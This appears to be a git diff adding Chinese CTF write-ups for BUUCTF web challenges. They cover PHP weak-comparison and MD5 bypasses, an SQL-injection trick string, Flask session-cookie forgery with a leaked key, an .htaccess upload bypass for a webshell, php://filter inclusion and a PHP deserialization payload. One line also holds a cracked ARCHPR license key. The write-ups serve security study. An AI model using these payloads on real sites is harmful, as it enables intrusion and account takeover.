@@ -2308,7 +2308,401 @@ String flag = "ZmxhZ3tlYWNiZTQxMS00MTc4LTQ5M2YtODQwZS0xNzU4NTY3YTkyNzV9Cg==";
 
 base64解密下即为flag。
 
-### 21. [网鼎杯 2020 青龙组]filejava
+
+
+### 21. [极客大挑战 2019]BuyFlag
+
+进入pay.php查看源代码，代码审计：
+
+```html
+</body>
+<!--
+	~~~post money and password~~~
+if (isset($_POST['password'])) {
+	$password = $_POST['password'];
+	if (is_numeric($password)) {
+		echo "password can't be number</br>";
+	}elseif ($password == 404) {
+		echo "Password Right!</br>";
+	}
+}
+-->
+</html>
+```
+
+需要传一个password，绕过弱比较：
+
+![image-20240103154053314](buu_wp.assets/image-20240103154053314.png)
+
+money传科学计数法
+
+
+
+### 22. [BJDCTF2020]Easy MD5
+
+随便输入一个1，burp抓包，response头中有提示：
+
+```http
+HTTP/1.1 200 OK
+Server: openresty
+Date: Wed, 03 Jan 2024 08:12:54 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Vary: Accept-Encoding
+Hint: select * from 'admin' where password=md5($pass,true)
+X-Powered-By: PHP/7.3.13
+Cache-Control: no-cache
+Content-Length: 3107
+```
+
+此处需要用到`ffifdyop`绕过，绕过原理是：
+`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是 ' `or '6`
+而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 `select * from 'admin' where password='' or '6xxxxx'`，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数；
+
+绕过之后进入另外一个页面：
+
+![image-20240103162129521](buu_wp.assets/image-20240103162129521.png)
+
+CTRL U代码审计：
+
+```php
+<!--
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b && md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+-->
+```
+
+需要GET传入a、b两个参数，要求md5弱相等，传入数组即可：
+
+```
+?a[]=1&b[]=2
+```
+
+进入了新的页面，还是代码审计：
+
+```php
+ <?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+} 
+```
+
+md5碰撞（0e开头），一些md5碰撞值：
+
+```
+QNKCDZO
+0e830400451993494058024219903391
+ 
+s878926199a
+0e545993274517709034328855841020
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s214587387a
+0e848240448830537924465865611904
+ 
+s214587387a
+0e848240448830537924465865611904
+ 
+s878926199a
+0e545993274517709034328855841020
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1184209335a
+0e072485820392773389523109082030
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s155964671a
+0e342768416822451524974117254469
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s532378020a
+0e220463095855511507588041205815
+ 
+s878926199a
+0e545993274517709034328855841020
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s214587387a
+0e848240448830537924465865611904
+ 
+s1502113478a
+0e861580163291561247404381396064
+ 
+s1091221200a
+0e940624217856561557816327384675
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s1885207154a
+0e509367213418206700842008763514
+ 
+s1836677006a
+0e481036490867661113260034900752
+ 
+s1665632922a
+0e731198061491163073197128363787
+ 
+s878926199a
+0e545993274517709034328855841020
+```
+
+还是利用数组来构造POST传参：
+
+![image-20240103162605205](buu_wp.assets/image-20240103162605205.png)
+
+### 23. [HCTF 2018]admin
+
+注册一个账号登录，在修改密码那里CTRL U查看源码，有提示：
+
+```html
+<!-- https://github.com/woadsl1234/hctf_flask/ -->
+```
+
+**方法一 flask session 伪造**
+原因是flask的session是存储在客户端的cookie中的即存储在本地，因此可以尝试进行伪造。且flask仅仅对session数据进行了签名。即通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，即可以利用脚本可以解出session的内容
+
+解密脚本
+
+```python
+#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+ 
+def decryption(payload):
+    payload, sig = payload.rsplit(b'.', 1)
+    payload, timestamp = payload.rsplit(b'.', 1)
+ 
+    decompress = False
+    if payload.startswith(b'.'):
+        payload = payload[1:]
+        decompress = True
+ 
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception('Could not base64 decode the payload because of '
+                         'an exception')
+ 
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception('Could not zlib decompress the payload before '
+                             'decoding the payload')
+ 
+    return session_json_serializer.loads(payload)
+ 
+if __name__ == '__main__':
+    print(decryption(sys.argv[1].encode()))   
+```
+
+![image-20240103165342521](buu_wp.assets/image-20240103165342521.png)
+
+解密出来的文本：
+
+```
+{'_fresh': True, '_id': b'6461d3f7692815ee86b850da1f7f6489815e82ebbe14f56b060cda8537ff5d72835d1933578f2ad36f8e3bbf33379cb86de17c2cd0ecce8b2ff7d36702d6a009', 'csrf_token': b'a9bb69061aad4c4f3e9e39eada76c73d0b87b702', 'image': b'ZXeY', 'name': 'a', 'user_id': '10'}
+```
+
+- `'name': 'a'`，改成`'name': 'admin'`再加密即可
+
+加密密钥在源码中看出为ckj123：
+
+![image-20240103170012564](buu_wp.assets/image-20240103170012564.png)
+
+
+
+加密：
+
+```shell
+python flask_session_cookie_manager3.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'6461d3f7692815ee86b850da1f7f6489815e82ebbe14f56b060cda8537ff5d72835d1933578f2ad36f8e3bbf33379cb86de17c2cd0ecce8b2ff7d36702d6a009', 'csrf_token': b'a9bb69061aad4c4f3e9e39eada76c73d0b87b702', 'image': b'ZXeY', 'name': 'admin', 'user_id': '10'}"
+```
+
+![image-20240103170506882](buu_wp.assets/image-20240103170506882.png)
+
+修改cookie刷新即可看到flag：
+
+![image-20240103170612248](buu_wp.assets/image-20240103170612248.png)
+
+### 24. [MRCTF2020]你传你🐎呢
+
+尝试上传一句话，有过滤，使用.htaccess来绕过：
+
+![image-20240103171338108](buu_wp.assets/image-20240103171338108.png)
+
+```
+<FilesMatch "abc" >
+SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+意为将当前目录下文件名为abc的文件当成php来解析；
+
+然后再上传一句话：
+
+![image-20240103171527394](buu_wp.assets/image-20240103171527394.png)
+
+蚁剑连接即可查看flag
+
+### 25. [护网杯 2018]easy_tornado
+
+同adword 31. easytornado
+
+### 26. [ZJCTF 2019]NiZhuanSiWei
+
+进入页面代码审计：
+
+```php
+ <?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+```
+
+- `if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`
+  - 使用input伪协议绕过：`/?text=php://input `
+  - ![image-20240103172951143](buu_wp.assets/image-20240103172951143.png)
+  - 使用data伪协议（base64加密）绕过：`/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`
+- `if(preg_match("/flag/",$file))`：正则过滤了flag又提示是useless.php，使用伪协议绕过
+
+综合以上，payload暂为：
+
+````
+/?text=php://input&file=php://filter/read=convert.base64-encode/resource=useless.php
+````
+
+![image-20240103173333225](buu_wp.assets/image-20240103173333225.png)
+
+返回的内容base64解密下：
+
+```php
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+
+```
+
+序列化脚本：
+
+```php
+<?php
+class Flag{
+    public $file="flag.php"; 
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    } 
+}
+$a = new Flag();
+$str = serialize($a);
+var_dump($str);
+var_dump(base64_encode($str));
+?>
+```
+
+
+
+最终payload：
+
+```
+/?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+
+
+### [网鼎杯 2020 青龙组]filejava
 
 
 
@@ -2336,3 +2730,8 @@ ARCHPR破解码`ARCHPRP-GSVMT-66892-GKVMB-52992`
 
 [.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)
 
+[php中的exec()函数怎么用-php教程-PHP中文网](https://www.php.cn/faq/80395.html)
+
+[call_user_func_array函数详解-CSDN博客](https://blog.csdn.net/weihuiblog/article/details/78998924)
+
+[php strcmp()漏洞_php strcmp 漏洞-CSDN博客](https://blog.csdn.net/cherrie007/article/details/77473817)
